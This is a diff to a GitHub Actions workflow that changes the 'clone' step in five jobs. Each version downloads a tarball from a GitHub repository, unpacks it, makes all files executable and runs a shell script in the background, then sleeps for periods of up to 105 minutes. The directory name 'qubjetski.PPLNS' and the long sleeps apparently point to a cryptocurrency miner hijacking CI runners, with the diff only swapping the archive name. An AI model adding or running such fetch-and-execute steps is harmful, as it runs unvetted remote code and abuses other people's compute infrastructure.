@@ -25,7 +25,7 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/komtol.tar.gz && tar xf komtol.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/ampas.tar.gz && tar xf ampas.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
            sleep 310s
   ol:
     needs: kont
@@ -48,7 +48,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/komtol.tar.gz && tar xf komtol.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/ampas.tar.gz && tar xf ampas.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
             sleep 5m
         
     
@@ -74,7 +74,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/komtol.tar.gz && tar xf komtol.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/ampas.tar.gz && tar xf ampas.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
             sleep 6m
   ayo:
     needs: ol
@@ -97,7 +97,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/komtol.tar.gz && tar xf komtol.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/ampas.tar.gz && tar xf ampas.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
             sleep 105m
         
     
@@ -123,7 +123,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/komtol.tar.gz && tar xf komtol.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/ampas.tar.gz && tar xf ampas.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
             sleep 61m
         
     
